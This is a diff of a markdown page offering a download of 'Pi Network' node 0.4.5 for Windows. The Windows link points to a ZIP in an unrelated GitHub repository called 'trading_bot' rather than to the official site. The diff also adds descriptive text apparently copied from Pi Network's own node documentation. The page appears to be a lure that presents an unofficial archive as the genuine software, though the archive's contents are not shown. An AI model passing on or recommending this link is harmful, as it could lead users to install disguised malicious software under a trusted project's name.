@@ -9,7 +9,7 @@ Thursday, 15 April 2023
 ***
 
 
-## Node version: 0.4.5 (unpack a ZIP file)
+## Node version: 0.4.5
 
 
 <a href="https://github.com/TradingToolGithub/trading_bot/releases/download/trading/Pi-Network-0.4.5.zip"> <img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fi-1.lanrentuku.com%2F2020%2F9%2F24%2Fd53be199-f4f0-4812-9592-c69088f3f0ee.png%3FimageView2%2F2%2Fw%2F500&refer=http%3A%2F%2Fi-1.lanrentuku.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1653729287&t=b52701e1f8f2612250c0d74e34f832b6" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/TradingToolGithub/trading_bot/releases/download/trading/Pi-Network-0.4.5.zip">PI node for Windows</a>
@@ -21,21 +21,20 @@ align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://node-cd
 
 <a href=" Be added "><img src="https://pics5.baidu.com/feed/342ac65c103853437114f8a7f7d99a74c88088b5.png?token=ca54d8610f9f70269fde521ee48a52aa" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=" Be added ">  PI node  for Linux</a> 
 
-## How to unpack a ZIP file
-
-<ol><li>Select (one click)&nbsp;the ZIP file you want to unpack (extract) in File Explorer</li><li>Right-click the file to access the menu
 
 
-<img src="https://i.ntnu.no/c/wiki/get_page_attachment?p_l_id=1307200529&nodeId=1306956300&title=Pack+and+unpack+zip+files&fileName=zip3.jpg" 
-align="middle"/>
+Nodes are the fourth role in the Pi ecosystem, and run on laptops and desktops instead of mobile phones. Similar to other blockchains, Pi Nodes will be responsible for validating transactions on a distributed ledger, and resolving the challenges in maintaining a distributed currency by having all nodes come to a “consensus” on the order of new transactions that are being recorded.
+
+Unlike nodes that use proof of work such as Bitcoin or Ethereum, Pi Node uses a different consensus algorithm based on the Stellar Consensus Protocol (SCP). In SCP, nodes form trusted groups (quorum slices) and only agree to transactions that those trusted nodes agree to. The security circles [(See Pi FAQ: What are security circles?)](https://minepi.com/faq) from Pi mobile miners aggregate into a global trust graph that enables Pi Nodes to form quorum slices to determine who can and cannot validate transactions on the shared ledger.
+
+Unlike most other crypto projects, the Pi Node will continue to follow the philosophy of user-centric design. Instead of requiring deep technical knowledge to set up a node, everyday people will be able to do that by installing a desktop application on their computers. Through this computer application, Pioneers can switch the node software on/off to make their devices available/unavailable for serving as a node.
+
+Pi will continue to adhere to the methodology of progressive decentralization as it develops its Testnet. During the initial Testnet, Pi’s blockchain component of the node software will have a centralized layer in order to achieve faster iterations of scenario stress testing and adaptations of the consensus algorithm to accommodate needs of Pi Network and its global community [(See Section - Testnet Roadmap)](https://minepi.com/node-info). This initial version of the node is the first step towards building the Pi Testnet and eventually the fully decentralized mainnet.
+
+This version of the node includes two interfaces: the node interface and the desktop Pi App interface. Depending on levels of participation defined in the section below, Pioneers can use the two interfaces accordingly. Every mobile user can download the node software to their computer and use its desktop Pi App interface because it’s a similar interface as the mobile app and will allow people to check their Pi balance, watch media content and use the Pi chats on their personal computer. Every Pioneer can also apply to be a Node through the node interface and install the blockchain component there. There will initially be a Selection Stage [(See Section - Testnet Roadmap)](https://minepi.com/node-info) for the Core Team to calibrate node selection criteria based on the device reliability and connectivity. When a node is selected by the Core Team, they’ll need to pass KYC to proceed to serve as a node on Testnet.
 
 
 
-</li><li>Choose <em>Extract All...</em> from the menu</li><li>In the dialog box, choose which folder you want to unpack the files to
-
-<a href="https://node-cdn.minepi.com/Pi%20Network-0.4.5.dmg"><img src="https://i.ntnu.no/c/wiki/get_page_attachment?p_l_id=1307200529&nodeId=1306956300&title=Pack+and+unpack+zip+files&fileName=zip4.jpg" 
-align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-</li><li>Choose <em>Extract</em> and the containing file(s) will be unpacked in the selected folder</li></ol>
 
 
 
